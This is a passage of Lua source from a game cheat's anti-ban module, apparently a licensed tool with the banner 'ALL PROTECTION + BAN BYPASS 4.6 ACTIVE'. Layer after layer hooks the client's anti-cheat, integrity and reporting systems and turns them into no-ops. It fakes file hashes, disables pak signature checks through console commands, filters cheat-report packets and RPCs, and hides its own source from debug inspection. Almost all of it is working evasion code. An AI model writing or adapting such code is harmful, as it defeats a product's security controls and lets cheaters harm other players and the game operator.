  ["SwiftHawkData"]=1, ["AntiCheatReport"]=1, ["CheatDetection"]=1, ["ViolationReport"]=1,
  ["SecurityViolation"]=1, ["IntegrityCheck"]=1, ["SignatureVerify"]=1,
  ["OperationalStats"]=1, ["ReportOperationalStats"]=1, ["OperationalStatsReport"]=1
}
local BlockRpcNames = {
  "RPC_Server_ClientSecMrpcsFlow", "RPC_Server_SwiftHawk",
  "RPC_Server_ClientSwiftHawkWithParams", "RPC_Server_ReportSimulateCharacterLocation",
  "RPC_Client_ShootVertifyRes", "RPC_ClientCoronaLab", "RPC_OperationalStats"
}
local KillSubSystems = {
  "AFKReportorSubsystem", "ClientDataStatistcsSubsystem", "AvatarExceptionSubsystem",
  "ShootVerifySubSystemClient", "MemoryCheckSubsystem", "SpeedCheckSubsystem",
  "WallCheckSubsystem", "FileCheckSubsystem", "BehaviorScoreSubsystem",
  "CoronaLabSubsystem", "PlayerSecurityInfoSubsystem", "ClientCircleFlowSubsystem",
  "ModifierExceptionSubsystem", "SimulateCharacterSubsystem",
  "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem",
  "ClientHawkEyePatrolSubsystem", "DSHawkEyePatrolSubsystem",
  "GameReportSubsystem", "ReplaySubsystem", "SwiftHawkSubsystem",
  "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
  "MD5CheckSubsystem", "PakVerifySubsystem", "OperationalStatsSubsystem",
  "MrpcsFlowSubsystem", "CircleFlowSubsystem",
  "ClientESPDetectionSubsystem", "ClientAimTrackingSubsystem",
  "ClientRenderCheckSubsystem", "ClientMemoryGuardSubsystem",
  "ClientKernelCheckSubsystem", "ClientWallhackDetectionSubsystem",
  "ClientAntiCheatSubsystem", "ClientSecMrpcsFlowSubsystem",
  "ShootVerifySubSystemClient"
}

function Shield.NeutralizeSubSystems()
  pcall(function()
    local mgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    if mgr then
      for _, name in ipairs(KillSubSystems) do
        local sub = mgr:Get(name)
        if sub then
          MuteObject(sub)
          for _, tm in ipairs({"timer", "heartbeatTimer", "reportTimer"}) do
            if sub[tm] then pcall(function() sub:RemoveGameTimer(sub[tm]) end) end
          end
        end
      end
    end
    local flowRunner = package.loaded["GameLua.Mod.Library.GamePlay.Avatar.Exception.AvatarExceptionPlayerInst"]
    if flowRunner then
      flowRunner.CheckAvatarException, flowRunner.CheckAvatarExceptionOnce = NoOp, NoOp
      flowRunner.ReportAvatarException = NoNil
      flowRunner.CheckSlotMeshVisible, flowRunner.CheckPawnVisible = NoFalse, NoFalse
      flowRunner.CheckCanBugglyPostException = NoFalse
    end
    local rep = package.loaded["client.slua.logic.replay.logic_report_replay"]
    if rep then rep.ReportReplay, rep.SendReportReq, rep.UploadReplay = NoOp, NoOp, NoOp end
  end)
end

function Shield.NeutralizeGlobalFlows()
  pcall(function()
    if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
    local GC = _G.GameplayCallbacks
    for _, f in ipairs(ReportFlowNames) do
      if _G[f] then _G[f] = NoOp end
      GC[f] = NoOp
    end
    GC.CheckReportSecAttackFlowWithAttackFlow = NoFalse
    GC.CheckReportSecAttackFlow = NoFalse
    for _, f in ipairs({"IsEnableReportMrpcsInCircleFlow", "IsEnableReportMrpcsInPartCircleFlow", "IsEnableReportMrpcsFlow", "IsEnableReportAttackFlow", "IsEnableReportHitFlow", "IsEnableReportCircleFlow"}) do
      if _G[f] then _G[f] = NoFalse end
    end
    local origState = GC.OnDSPlayerStateChanged
    GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
      local s = State and string.lower(tostring(State)) or ""
      local danger = {
        ["cheatdetected"]=1, ["connectionlost"]=1, ["connectiontimeout"]=1,
        ["connectionexception"]=1, ["netdrivererror"]=1, ["banned"]=1, ["kicked"]=1,
        ["suspended"]=1, ["violationdetected"]=1, ["integrityfailure"]=1, ["securityviolation"]=1
      }
      if danger[s] then return end
      if origState and type(origState) == "function" then
        return origState(UID, State, bPure, bSafe, Param)
      end
    end
    GC.OnPlayerNetConnectionClosed = NoNil
    GC.OnPlayerActorChannelError = NoNil
    GC.OnPlayerRPCValidateFailed = NoNil
    GC.OnPlayerSpectateException = NoNil
    GC.OnShutdownAfterError = NoNil
  end)
end

local _NetShielded = false
function Shield.NeutralizeNet()
  if _NetShielded then return end
  pcall(function()
    if NetUtil and NetUtil.SendPacket then
      local original = NetUtil.SendPacket
      NetUtil.SendPacket = function(packetName, ...)
        if BlockPacketNames[packetName] then return nil end
        return original(packetName, ...)
      end
    end
    if _G.SendRPC then
      local originalRpc = _G.SendRPC
      _G.SendRPC = function(rpcName, ...)
        for _, b in ipairs(BlockRpcNames) do
          if rpcName == b then return nil end
        end
        return originalRpc(rpcName, ...)
      end
    end
    _NetShielded = true
  end)
end

function Shield.NeutralizeHiggs()
  pcall(function()
    local Higgs = require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
    if Higgs then
      local methods = {
        "ControlMHActive", "Tick", "OnTick", "MHActiveLogic", "TriggerAvatarCheck",
        "StartAvatarCheck", "ReportItemID", "ReceiveAnyDamage", "OnWeaponHitRecord",
        "ShowSecurityAlert", "ServerReportAvatar", "ClientReportNetAvatar", "SendHisarData",
        "ValidateSecurityData", "StaticShowSecurityAlertInDev", "RPC_Client_ShootVertifyRes",
        "RPC_Server_ReportSimulateCharacterLocation", "DisableHiggsBoson", "CheckMHActive",
        "ReportViolation", "ProcessSecurityEvent", "ValidatePlayer", "CheckIntegrity"
      }
      for _, m in ipairs(methods) do if Higgs[m] then Higgs[m] = NoNil end end
      Higgs.GetNetAvatarItemIDs = NoList
      Higgs.GetCurWeaponSkinID = NoZero
      Higgs.IsMHActive = NoFalse
      Higgs.bMHActive = false
      Higgs.bCallPreReplication = false
      if Higgs.BlackList then
        local keys = {}
        for k in pairs(Higgs.BlackList) do table.insert(keys, k) end
        for _, k in ipairs(keys) do Higgs.BlackList[k] = nil end
      end
    end
    _G.BlackList = {}
    if _G.AvatarCheckCallback then
      _G.AvatarCheckCallback.StartAvatarCheck = NoNil
      _G.AvatarCheckCallback.OnReportItemID = NoNil
      _G.AvatarCheckCallback.PostPlayerControllerLoginInit = function(pc)
        if Around(pc) then
          if pc.HiggsBosonComponent then
            pcall(function() pc.HiggsBosonComponent:ControlMHActive(0) end)
            pc.HiggsBosonComponent.bMHActive = false
          end
          if pc.HiggsBoson then
            pcall(function() pc.HiggsBoson:ControlMHActive(0) end)
            pc.HiggsBoson.bMHActive = false
          end
        end
      end
    end
  end)
end

function Shield.NeutralizePlayers()
  pcall(function()
    for _, c in ipairs({"PlayerSecurityInfoCollector", "PlayerSecurityInfo", "SecurityInfoCollector", "ClientSecurityCollector", "PlayerAntiCheatCollector"}) do
      if _G[c] then MuteObject(_G[c]) end
    end
    local mgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    if mgr then
      local sec = mgr:Get("PlayerSecurityInfoSubsystem")
      if sec then
        sec.ReportData, sec.CollectData, sec.SendToServer = NoNil, NoNil, NoNil
        sec.CheckCheat = NoFalse
        sec.ValidatePlayer = NoOp
      end
      local sw = mgr:Get("SwiftHawkSubsystem")
      if sw then sw.ReportData, sw.SendReport, sw.CollectTelemetry = NoNil, NoNil, NoNil end
      local cr = mgr:Get("ModifierExceptionSubsystem")
      if cr then
        cr.ReportException, cr.ReportModifierError = NoNil, NoNil
        cr.CheckModifier, cr.ValidateModifier = NoOp, NoOp
      end
      local sm = mgr:Get("SimulateCharacterSubsystem")
      if sm then sm.ReportLocation, sm.SendLocationData = NoNil, NoNil; sm.VerifyLocation = NoOp end
      local sv = mgr:Get("ShootVerifySubSystemClient")
      if sv then
        sv.OnShootVerifyFailed, sv.SendVerifyData, sv.ReportBulletHit, sv.UploadHitInfo = NoNil, NoNil, NoNil, NoNil
        sv.VerifyShot = NoOp
      end
    end
    if _G.bReportedModifierException then _G.bReportedModifierException = false end
    if _G.BulletHitInfoUploadData then MuteObject(_G.BulletHitInfoUploadData) end
  end)
end

function Shield.NeutralizeStats()
  pcall(function()
    local mgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    local ops = (mgr and mgr:Get("OperationalStatsSubsystem")) or _G.OperationalStatsSubsystem
    if ops then
      ops.ReportOperationalStats, ops.AddOperationalStats = NoNil, NoNil
      ops.HandleTouchBegin, ops.HandleTouchEnd = NoNil, NoNil
      ops.OnInit, ops.HandleEnterFighting, ops.OnBattleResult = NoNil, NoNil, NoNil
      ops.StatsData = {}
    end
  end)
end

function Shield.NeutralizeLoading()
  pcall(function()
    local flags = {"ENABLE_REPORT", "ENABLE_ANTI_CHEAT", "ENABLE_SECURITY", "ENABLE_TELEMETRY", "ENABLE_ANALYTICS", "ENABLE_CRASH_REPORT", "ENABLE_PERFORMANCE_REPORT"}
    for _, f in ipairs(flags) do if _G[f] then _G[f] = false end end
    local realRequire = require
    local poisoned = {"HiggsBosonComponent", "PlayerSecurityInfoSubsystem", "CoronaLabSubsystem", "ClientCircleFlowSubsystem", "ModifierExceptionSubsystem", "ShootVerifySubSystemClient", "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem", "OperationalStatsSubsystem"}
    _G.require = function(moduleName)
      for _, bad in ipairs(poisoned) do
        if moduleName:find(bad, 1, true) then return {} end
      end
      return realRequire(moduleName)
    end
  end)
end

function Shield.NeutralizeSweep()
  local needle = {"verify", "integrity", "signature", "filecheck", "file_check", "hashcheck", "hash_check", "tss", "security", "report"}
  local seen = {}
  pcall(function()
    local function Watch(mod)
      if type(mod) ~= "table" or seen[mod] then return end
      seen[mod] = true
      MuteObject(mod)
    end
    for key, mod in pairs(package.loaded) do
      if type(key) == "string" then
        local low = string.lower(key)
        for _, n in ipairs(needle) do
          if string.find(low, n, 1, true) then Watch(mod) break end
        end
      end
    end
    for key, mod in pairs(_G) do
      if type(key) == "string" then
        local low = string.lower(key)
        for _, n in ipairs(needle) do
          if string.find(low, n, 1, true) then Watch(mod) break end
        end
      end
    end
  end)
end

function Shield.Hum()
  A.Up.Heartbeat = math.random(15, 45)
  A.Up.PingJitter = math.random(-12, 18)
  A.Up.FakeKd = 0.9 + math.random() * 1.9
  A.Up.FakeHead = 9 + math.random() * 22
  pcall(function()
    if debug and debug.getinfo then
      local origin = debug.getinfo
      debug.getinfo = function(level, what)
        local info = origin(level, what)
        if info and info.source then
          local src = info.source
          if string.find(src, "BRPlayerCharacterBase", 1, true) or string.find(src, "AegisShell", 1, true) then
            info.source = "ProtectedSource"
            info.short_src = "ProtectedSource"
          end
        end
        return info
      end
    end
  end)
  pcall(function()
    if debug then
      if debug.sethook then debug.sethook = function() end end
      if debug.getlocal then debug.getlocal = function() end end
      if debug.setupvalue then debug.setupvalue = function() end end
    end
    if string and string.dump then
      string.dump = function() return "" end
    end
  end)
end

function Shield.InstallAll()
  if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end
  if A.Up.Shielded then return end
  A.Up.Shielded = true
  BanShield.Install()
  Shield.NeutralizeLoaders()
  Shield.NeutralizeHashes()
  Shield.NeutralizeLogs()
  Shield.NeutralizeSkins()
  Shield.NeutralizeSubSystems()
  Shield.NeutralizeGlobalFlows()
  Shield.NeutralizeNet()
  Shield.NeutralizeHiggs()
  Shield.NeutralizePlayers()
  Shield.NeutralizeStats()
  Shield.NeutralizeSweep()
  Shield.NeutralizeLoading()
  Shield.Hum()
  pcall(function() import("KismetSystemLibrary").ExecuteConsoleCommand(nil, "r.ShaderPipelineCache 0") end)
  print("[SAMEER] ALL PROTECTION + BAN BYPASS 4.6 ACTIVE")
end
-- ==============================================================================
-- LAYER 01: SLUA SIGNATURE BYPASS
-- ==============================================================================
local function L01_SLUA()
    local ok = false
    pcall(function()
        if slua and type(slua.getSignature) == "function" then
            slua.getSignature = function() return 0xDEADBEEF end
            ok = true
        end
        local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
        if loader then
            loader.verifyBytecode = retTrue
            loader.checkIntegrity = retTrue
            loader.disableSignatureCheck = retTrue
            ok = true
        end
        local ser = package.loaded["slua.serialize"]
        if ser then ser.check = retTrue; ser.verify = retTrue; ok = true end
        if _G.slua_verify then _G.slua_verify = retTrue; ok = true end
        if _G.check_slua_integrity then _G.check_slua_integrity = retTrue; ok = true end
        if jit and jit.attach then
            jit.attach(function() end, "bc")
            ok = true
        end
    end)
    MarkLayer("L01_SLUA", ok)
end

-- ==============================================================================
-- LAYER 02: MD5 / PAK SIGNATURE BYPASS
-- ==============================================================================
local function L02_MD5()
    local ok = false
    pcall(function()
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "pakchunk.EnableSignatureCheck 0")
            console.ExecuteConsoleCommand(nil, "s.VerifyPak 0")
            console.ExecuteConsoleCommand(nil, "sig.Check 0")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
            ok = true
        end
        local CMode = import("CreativeModeBlueprintLibrary")
        if CMode then
            CMode.MD5HashByteArray = function() return "00000000000000000000000000000000" end
            CMode.MD5HashFile = function() return "00000000000000000000000000000000" end
            CMode.GetContentDiffData = function() return true, "OK" end
            CMode.VerifyFileIntegrity = retTrue
            ok = true
        end
        if _G.MD5Hash then _G.MD5Hash = function() return "00000000000000000000000000000000" end; ok = true end
        if _G.CRC32 then _G.CRC32 = function() return 0 end; ok = true end
        if _G.SHA1 then _G.SHA1 = function() return "0000000000000000" end; ok = true end
        local FHC = package.loaded["common.file_hash_checker"]
        if FHC then
            FHC.CheckFileMD5 = retTrue
            FHC.VerifyAll = retTrue
            FHC.GetHash = function() return "0000000000000000" end
            ok = true
        end
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            TssSdk.GetFileMD5 = function() return "0000000000000000" end
            TssSdk.VerifyFileSignature = retTrue
            ok = true
        end
        local STExtra = import("STExtraBlueprintFunctionLibrary")
        if STExtra then
            STExtra.CheckMD5 = retTrue
            STExtra.GetMD5 = function() return "0000000000000000" end
            STExtra.VerifyFile = retTrue
            ok = true
        end
    end)
    MarkLayer("L02_MD5", ok)
end

-- ==============================================================================
-- LAYER 03: SKIN / AVATAR EXCEPTION BYPASS
-- ==============================================================================
local function L03_SKIN()
    local ok = false
    pcall(function()
        local ptlog = package.loaded["client.slua.logic.download.report.puffer_tlog"]
        if ptlog then
            ptlog.ReportEvent = nop
            ptlog.ReportDownloadResult = nop
            ptlog.ReportODPTDError = nop
            ptlog.ReportSkinError = nop
            ok = true
        end
        local AvatarUtils = package.loaded["AvatarUtils"]
        if AvatarUtils then
            AvatarUtils.CheckIsWeaponInBlackList = retFalse
            AvatarUtils.IsValidAvatar = retTrue
            AvatarUtils.CheckAvatarIntegrity = retTrue
            AvatarUtils.ReportInvalidAvatar = nop
            ok = true
        end
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local sub = SubMgr:Get("FileCheckSubsystem")
            if sub then
                sub.StartCheck = nop
                sub.ReportAbnormalFile = nop
                sub.StopCheck = nop
                ok = true
            end
        end
        local eqEx = package.loaded["client.slua.logic.report.EquipmentExceptionReport"]
        if eqEx then
            eqEx.Report = nop
            eqEx.SendException = nop
            ok = true
        end
        local AvaEx = package.loaded["GameLua.Mod.Library.GamePlay.Avatar.Exception.AvatarExceptionPlayerInst"]
        if AvaEx then
            AvaEx.CheckAvatarException = nop
            AvaEx.CheckAvatarExceptionOnce = nop
            AvaEx.ReportAvatarException = nop
            AvaEx.CheckSlotMeshVisible = retFalse
            AvaEx.CheckPawnVisible = retFalse
            AvaEx.CheckCanBugglyPostException = retFalse
            ok = true
        end
    end)
    MarkLayer("L03_SKIN", ok)
end

-- ==============================================================================
-- LAYER 04: LOG / CRASH REPORTER BYPASS
-- ==============================================================================
local function L04_LOG()
    local ok = false
    pcall(function()
        local SMTD = import("ScreenshotMTDer")
        if SMTD then
            SMTD.MTDePicture = function() return "" end
            SMTD.ReMTDePicture = function() return "" end
            SMTD.HasCaptured = retTrue
            SMTD.TakeScreenshot = nop
            ok = true
        end
        local TLog = package.loaded["TLog"] or _G.TLog
        if TLog then
            TLog.Info = nop; TLog.Warning = nop; TLog.Error = nop
            TLog.Debug = nop; TLog.Report = nop; TLog.Send = nop; TLog.Flush = nop
            ok = true
        end
        local CrashSight = package.loaded["CrashSight"] or _G.CrashSight
        if CrashSight then
            CrashSight.ReportException = nop
            CrashSight.SetCustomData = nop
            CrashSight.Log = nop
            CrashSight.SendCrash = nop
            CrashSight.ReportUserException = nop
            ok = true
        end
        local GRU = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
        if GRU then
            GRU.BugglyPostExceptionFull = retFalse
            GRU.CheckCanBugglyPostException = retFalse
            GRU.ReplayReportData = nop
            GRU.ReportGameException = nop
            GRU.PostException = nop
            ok = true
        end
        local CTR = package.loaded["client.slua.logic.report.ClientToolsReport"]
        if CTR then
            CTR.SendReport = nop
            CTR.SendException = nop
            CTR.UploadLog = nop
            ok = true
        end
        for _, sdk in ipairs({"Firebase","Adjust","AppsFlyer","FacebookAnalytics","GameAnalytics"}) do
            local s = _G[sdk]
            if s then
                s.logEvent = nop; s.trackEvent = nop
                s.setEnabled = retFalse; s.sendEvent = nop; s.report = nop
                ok = true
            end
        end
    end)
    MarkLayer("L04_LOG", ok)
end

-- ==============================================================================
-- LAYER 05: SUBSYSTEM SCANNER BYPASS (real subsystem names)
-- ==============================================================================
local function L05_SCANNER()
    local ok = false
    pcall(function()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if not SubMgr then return end
        for _, name in ipairs(REAL_SECURITY_SUBSYSTEMS) do
            local sub = SubMgr:Get(name)
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and
                       (k:find("Report") or k:find("Send") or k:find("Upload") or
                        k:find("Verify") or k:find("Check") or k:find("Validate") or
                        k:find("Scan") or k:find("Detect") or k:find("Heartbeat") or
                        k:find("Flow")) then
                        pcall(function() sub[k] = nop end)
                    end
                end
                if sub.ReportPingDelayTimer then
                    pcall(function() sub:RemoveGameTimer(sub.ReportPingDelayTimer) end)
                    sub.ReportPingDelayTimer = nil
                end
                sub.DelayCount = 0
                ok = true
            end
        end
    end)
    MarkLayer("L05_SCANNER", ok)
end

-- ==============================================================================
-- LAYER 06: REPLAY TELEMETRY BYPASS
-- ==============================================================================
local function L06_REPLAY()
    local ok = false
    pcall(function()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            for _, name in ipairs({"GameReportSubsystem","ReplaySubsystem","RescueBtnReplayTraceSubsystem","SpectateAndReplaySubsystem"}) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and
                           (k:find("Report") or k:find("Trace") or k:find("Replay") or
                            k:find("Record") or k:find("Save") or k:find("Heartbeat")) then
                            pcall(function() sub[k] = nop end)
                        end
                    end
                    ok = true
                end
            end
        end
        local logRep = package.loaded["client.slua.logic.replay.logic_report_replay"]
        if logRep then
            logRep.ReportReplay = nop
            logRep.SendReportReq = nop
            logRep.UploadReplay = nop
            ok = true
        end
        if _G.ClientReplayDataReporter then
            _G.ClientReplayDataReporter.ReportIntArrayData = nop
            _G.ClientReplayDataReporter.ReportUInt8ArrayData = nop
            _G.ClientReplayDataReporter.ReportFloatArrayData = nop
            ok = true
        end
    end)
    MarkLayer("L06_REPLAY", ok)
end

-- ==============================================================================
-- LAYER 07: REPORT FLOW CALLBACK BLOCKER
-- ==============================================================================
local function L07_REPORT_FLOW()
    local ok = false
    pcall(function()
        local flows = {
            "ReportAimFlow","ReportHitFlow","ReportAttackFlow","ReportSecAttackFlow",
            "ReportFireArms","ReportVerifyInfoFlow","ReportMrpcsFlow","ReportPlayerBehavior",
            "ReportTeammatHurt","ReportMisKillByTeammate","ReportForbitPick","ReportPlayerMoveRoute",
            "ReportPlayerPosition","ReportVehicleMoveFlow","ReportSecTgameMovingFlow","ReportParachuteData",
            "ReportEquipmentFlow","ReportPlayersPing","ReportPlayerIP","ReportPlayerFramePingRecord",
            "ReportDSNetSaturation","ReportNetContinuousSaturate","ReportDSNetRate","ReportCircleFlow",
            "ReportSecMrpcsFlow","SendTssSdkAntiDataToLobby","SendDSErrorLogToLobby",
            "SendDSHawkEyePatrolLogToLobby","SendSecTLog","SendDataMiningTLog","SendActivityTLog",
            "SendClientMemUsage","SendClientFPS","OnClientCrashReport","OnNetworkLossDetected",
            "ReportMatchRoomData","SendClientStats","SendServerAvgTickDelta","SendClientDeviceInfo",
            "ReportDeviceFingerprint","SendNetworkInfo","ReportIPAddress","SendMACAddress","ReportHardwareID"
        }
        for _, f in ipairs(flows) do
            if _G[f] then _G[f] = nop; ok = true end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then
                _G.GameplayCallbacks[f] = nop
                ok = true
            end
        end
        for _, f in ipairs({"CheckReportSecAttackFlowWithAttackFlow","CheckReportSecAttackFlow"}) do
            if _G[f] then _G[f] = retFalse; ok = true end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then
                _G.GameplayCallbacks[f] = retFalse
                ok = true
            end
        end
        for _, f in ipairs({"IsEnableReportMrpcsInCircleFlow","IsEnableReportMrpcsInPartCircleFlow",
                            "IsEnableReportMrpcsFlow","IsEnableReportAttackFlow",
                            "IsEnableReportHitFlow","IsEnableReportCircleFlow"}) do
            if _G[f] then _G[f] = retFalse; ok = true end
        end
    end)
    MarkLayer("L07_REPORT_FLOW", ok)
end

-- ==============================================================================
-- LAYER 08: PLAYER SECURITY INFO BYPASS
-- ==============================================================================
local function L08_PLAYER_SEC()
    local ok = false
    pcall(function()
        local SecSub = safe_require("GameLua.Mod.BaseMod.Common.Security.PlayerSecurityInfoSubsystem")
        if SecSub then
            SecSub.ReportData = nop
            SecSub.CheckCheat = retFalse
            SecSub.ValidatePlayer = retTrue
            SecSub.CollectData = nop
            SecSub.SendToServer = nop
            ok = true
        end
        for _, c in ipairs({"PlayerSecurityInfoCollector","PlayerSecurityInfo","SecurityInfoCollector",
                            "ClientSecurityCollector","PlayerAntiCheatCollector"}) do
            if _G[c] then
                for k, v in pairs(_G[c]) do
                    if type(v) == "function" and
                       (k:find("Report") or k:find("Collect") or k:find("Send") or
                        k:find("Upload") or k:find("Record")) then
                        _G[c][k] = nop
                        ok = true
                    end
                end
            end
        end
    end)
    MarkLayer("L08_PLAYER_SEC", ok)
end

-- ==============================================================================
-- LAYER 09: MRPCS / CLIENT FLOW BYPASS
-- ==============================================================================
local function L09_CLIENT_FLOW()
    local ok = false
    pcall(function()
        for _, name in ipairs({"ClientSecMrpcsFlow","MrpcsFlow","MrpcsData",
                                "ClientCircleFlowSubsystem","ClientKillFlowSubsystem",
                                "ClientSecPlayerKillFlow"}) do
            local sub = package.loaded[name] or _G[name]
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and
                       (k:find("Report") or k:find("Send") or k:find("Flow") or
                        k:find("Record") or k:find("Process")) then
                        pcall(function() sub[k] = nop end)
                        ok = true
                    end
                end
            end
        end
    end)
    MarkLayer("L09_CLIENT_FLOW", ok)
end

-- ==============================================================================
-- LAYER 10: SWIFT HAWK BYPASS
-- ==============================================================================
local function L10_SWIFT_HAWK()
    local ok = false
    pcall(function()
        for _, f in ipairs({"SwiftHawk","ClientSwiftHawk","ClientSwiftHawkWithParams","SendSwiftHawkData"}) do
            if _G[f] then _G[f] = nop; ok = true end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then
                _G.GameplayCallbacks[f] = nop
                ok = true
            end
        end
        local sub = safe_require("GameLua.Mod.BaseMod.Client.Security.SwiftHawkSubsystem")
        if sub then
            sub.ReportData = nop
            sub.SendReport = nop
            sub.CollectTelemetry = nop
            ok = true
        end
    end)
    MarkLayer("L10_SWIFT_HAWK", ok)
end

-- ==============================================================================
-- LAYER 11: CORONA LAB BYPASS
-- ==============================================================================
local function L11_CORONA()
    local ok = false
    pcall(function()
        if _G.CoronaLab then
            _G.CoronaLab.ReportData = nop
            _G.CoronaLab.SendData = nop
            _G.CoronaLab.CollectData = nop
            _G.CoronaLab.Telemetry = nop
            ok = true
        end
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        local sub = SubMgr and SubMgr:Get("CoronaLabSubsystem")
        if sub then
            sub.ReportData = nop
            sub.SendToServer = nop
            sub.CollectTelemetry = nop
            sub.StopCollection = nop
            ok = true
        end
        -- GlobalPlayerCoronaData lockdown — writes silently swallowed
        _G.GlobalPlayerCoronaData = _G.GlobalPlayerCoronaData or {}
        local mt = getmetatable(_G.GlobalPlayerCoronaData) or {}
        mt.__newindex = function() end
        setmetatable(_G.GlobalPlayerCoronaData, mt)
        _G.BlackList = {}
        ok = true
    end)
    MarkLayer("L11_CORONA", ok)
end

-- ==============================================================================
-- LAYER 12: MODIFIER EXCEPTION BYPASS
-- ==============================================================================
local function L12_MODIFIER()
    local ok = false
    pcall(function()
        _G.bReportedModifierException = false
        local sub = safe_require("GameLua.Mod.BaseMod.Common.Security.ModifierExceptionSubsystem")
        if sub then
            sub.ReportException = nop
            sub.CheckModifier = retTrue
            sub.ValidateModifier = retTrue
            sub.ReportModifierError = nop
            ok = true
        end
    end)
    MarkLayer("L12_MODIFIER", ok)
end

-- ==============================================================================
-- LAYER 13: SIMULATE CHARACTER LOCATION BYPASS
-- ==============================================================================
local function L13_SIMULATE_CHAR()
    local ok = false
    pcall(function()
        local sub = safe_require("GameLua.Mod.BaseMod.Gameplay.Simulate.SimulateCharacterSubsystem")
        if sub then
            sub.ReportLocation = nop
            sub.SendLocationData = nop
            sub.VerifyLocation = retTrue
            ok = true
        end
    end)
    MarkLayer("L13_SIMULATE_CHAR", ok)
end

-- ==============================================================================
-- LAYER 14: SHOOT VERIFICATION BYPASS
-- ==============================================================================
local function L14_SHOOT_VERIFY()
    local ok = false
    pcall(function()
        local sub = safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if sub then
            sub.OnShootVerifyFailed = nop
            sub.SendVerifyData = nop
            sub.ReportBulletHit = nop
            sub.UploadHitInfo = nop
            sub.VerifyShot = retTrue
            ok = true
        end
        if _G.BulletHitInfoUploadData then
            _G.BulletHitInfoUploadData.Report = nop
            _G.BulletHitInfoUploadData.Send = nop
            _G.BulletHitInfoUploadData.Upload = nop
            ok = true
        end
    end)
    MarkLayer("L14_SHOOT_VERIFY", ok)
end

-- ==============================================================================
-- LAYER 15: NETWORK PACKET BLOCK
-- ==============================================================================
local function L15_NET_PACKET()
    local ok = false
    pcall(function()
        if NetUtil and NetUtil.SendPacket and not NetUtil._IsBypassed then
            local orig = NetUtil.SendPacket
            local blocked = {
                ["ReportAttackFlow"]=1, ["ReportSecAttackFlow"]=1, ["ReportFireArms"]=1,
                ["ReportVerifyInfoFlow"]=1, ["ReportMrpcsFlow"]=1, ["ReportPlayerBehavior"]=1,
                ["ReportTeammatHurt"]=1, ["ReportPlayerMoveRoute"]=1, ["ReportPlayerPosition"]=1,
                ["ReportSecVehicleMoveFlow"]=1, ["ReportVehicleMoveFlow"]=1, ["ReportParachuteData"]=1,
                ["ReportEquipmentFlow"]=1, ["ReportJumpFlow"]=1, ["ReportHurtFlow"]=1,
                ["on_tss_sdk_anti_data"]=1, ["ReportAimFlow"]=1, ["ReportHitFlow"]=1,
                ["ReportCircleFlow"]=1, ["report_players_ping"]=1, ["report_player_ip"]=1,
                ["report_net_saturate"]=1, ["report_speed_hack"]=1, ["report_wall_hack"]=1,
                ["report_aim_bot"]=1, ["report_esp_usage"]=1, ["report_modded_files"]=1,
                ["detect_cheat"]=1, ["ban_player"]=1, ["client_anti_cheat_report"]=1,
                ["ClientSecMrpcsFlow"]=1, ["MrpcsData"]=1,
                ["CheckReportSecAttackFlow"]=1, ["CheckReportSecAttackFlowWithAttackFlow"]=1,
                ["RPC_ClientCoronaLab"]=1, ["CoronaLabReport"]=1, ["CoronaLabData"]=1,
                ["PlayerSecurityInfo"]=1, ["ReportSecurityInfo"]=1, ["SendSecurityData"]=1,
                ["ClientCircleFlow"]=1, ["IsEnableReportMrpcsInCircleFlow"]=1,
                ["IsEnableReportMrpcsInPartCircleFlow"]=1, ["bReportedModifierException"]=1,
                ["ReportModifierException"]=1, ["RPC_Server_ReportSimulateCharacterLocation"]=1,
                ["ReportSimulateCharacterLocation"]=1, ["RPC_Client_ShootVertifyRes"]=1,
                ["BulletHitInfoUploadData"]=1, ["ShootVerifyFailed"]=1,
                ["report_unrealnet_exception"]=1, ["tss_sdk_report"]=1,
                ["SwiftHawk"]=1, ["ClientSwiftHawk"]=1, ["ClientSwiftHawkWithParams"]=1,
                ["SwiftHawkReport"]=1, ["SwiftHawkData"]=1,
                ["AntiCheatReport"]=1, ["CheatDetection"]=1, ["ViolationReport"]=1,
                ["SecurityViolation"]=1, ["IntegrityCheck"]=1, ["SignatureVerify"]=1,
                ["ReportSecTLog"]=1, ["report_client_scan_result"]=1,
                ["report_memory_exception"]=1, ["report_avatar_exception"]=1,
                ["report_character_state"]=1, ["report_vehicle_exception"]=1,
                ["report_camera_exception"]=1,
                ["ReportHeavyWeaponBoxSpawnFlow"]=1, ["ReportHeavyWeaponBoxActivationFlow"]=1,
                ["report_player_frame_ping_record"]=1,
                ["report_ds_net_saturation"]=1,
            }
            NetUtil.SendPacket = function(packetName, ...)
                if blocked[packetName] then return nil end
                return orig(packetName, ...)
            end
            NetUtil._IsBypassed = true
            ok = true
        end
        if _G.SendRPC and not _G._SendRPCBypassed then
            local origRPC = _G.SendRPC
            local blockedRPC = {
